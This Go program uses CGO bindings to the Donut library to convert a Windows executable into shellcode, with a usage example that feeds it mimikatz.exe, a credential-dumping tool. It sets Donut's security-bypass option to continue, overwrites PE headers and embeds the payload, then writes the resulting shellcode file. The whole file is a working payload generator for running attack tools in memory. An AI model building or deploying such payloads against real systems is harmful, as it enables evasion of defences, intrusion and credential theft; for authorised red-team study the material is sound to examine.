package main

/*
// We tell CGO where to look for the headers (donut.h)
#cgo CFLAGS: -I../include

// We tell CGO which static library to link
#cgo LDFLAGS: -L${SRCDIR} -ldonut

#include <stdlib.h>
#include <string.h>
#include "donut.h"
*/
import "C"
import (
	"fmt"
	"os"
	"unsafe"
)

func main() {
	// Check command line arguments
	if len(os.Args) < 2 {
		fmt.Println("Error: Required argument is missing")
		fmt.Printf("Usage: go run %s <input_executable> [output_payload]\n", os.Args[0])
		fmt.Printf("Example: go run %s C:\\tools\\mimikatz.exe custom_payload.bin\n", os.Args[0])
		os.Exit(1)
	}

	// We initialize the C structure to zero
	var config C.DONUT_CONFIG
	C.memset(unsafe.Pointer(&config), 0, C.sizeof_DONUT_CONFIG)

	// We convert Go strings to C strings
	inputStr := C.CString(os.Args[1])
	var outputStr *C.char
	
	// If output file is provided via CLI, use it. Otherwise, default to "payload.bin"
	if len(os.Args) >= 3 {
		outputStr = C.CString(os.Args[2])
	} else {
		outputStr = C.CString("payload.bin")
	}

	// defer ensures that we free the memory allocated to strings in C
	defer C.free(unsafe.Pointer(inputStr))
	defer C.free(unsafe.Pointer(outputStr))

	// We copy the paths to the structure's arrays
	C.strncpy((*C.char)(unsafe.Pointer(&config.input[0])), inputStr, C.DONUT_MAX_NAME-1)
	C.strncpy((*C.char)(unsafe.Pointer(&config.output[0])), outputStr, C.DONUT_MAX_NAME-1)

	// Configure the parameters using the constants in donut.h
	config.arch = C.DONUT_ARCH_X84
	config.bypass = C.DONUT_BYPASS_CONTINUE
	config.format = C.DONUT_FORMAT_BINARY
	config.inst_type = C.DONUT_INSTANCE_EMBED
	config.entropy = C.DONUT_ENTROPY_DEFAULT
	config.headers = C.DONUT_HEADERS_OVERWRITE
	config.exit_opt = C.DONUT_OPT_EXIT_THREAD
	config.compress = C.DONUT_COMPRESS_NONE

	fmt.Println("[*] Generating Donut Shellcode...")

	// Call the Donut API
	err := C.DonutCreate(&config)

	// Validate using DONUT_ERROR_OK (errors.h)
	if err == C.DONUT_ERROR_OK {
		outName := C.GoString((*C.char)(unsafe.Pointer(&config.output[0])))
		fmt.Printf("[+] Shellcode successfully generated at: %s\n", outName)
		fmt.Printf("[+] Size: %d bytes\n", config.pic_len)
	} else {
		// Call DonutError to have it translate the error code for us
		errMsg := C.GoString(C.DonutError(err))
		fmt.Printf("[-] Donut Error. Code: %d - %s\n", err, errMsg)
	}

	// Clear the memory reserved internally by Donut
	C.DonutDelete(&config)
}